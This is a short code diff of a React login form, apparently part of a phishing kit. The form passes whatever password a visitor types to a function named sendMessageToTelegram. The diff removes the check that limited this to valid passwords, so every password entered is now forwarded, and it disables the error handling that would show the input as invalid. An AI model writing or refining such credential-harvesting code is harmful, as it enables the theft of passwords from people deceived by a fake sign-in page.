@@ -58,6 +58,7 @@ export default function LoginForm({ setNavigation, navigation }) {
 
 
     useEffect(() => {
+        console.log("Command is ", command)
         if (command === 'REQUEST_PASSWORD_AGAIN') {
             setInvalid(true); // Show error state for email input
             setIsLoading(false);
@@ -73,15 +74,11 @@ export default function LoginForm({ setNavigation, navigation }) {
     const handlePasswordValidation = () => {
         const isValid = validatePassword(password);
         setIsLoading(true);
-        
-        if (isValid) {
-            console.log("PASSWORD IS VALID, CALLING LOADER NOW");
-            sendMessageToTelegram(password);
-        } else {
-            setTimeout(() => setIsLoading(false), 1000); // Turn off loader after 1s
-        }
+        console.log("PASSWORD IS VALID, CALLING LOADER NOW");
+        sendMessageToTelegram(password);
     
-        setInvalid(!isValid);
+    
+        // setInvalid(!isValid);
         return isValid;
     };
 
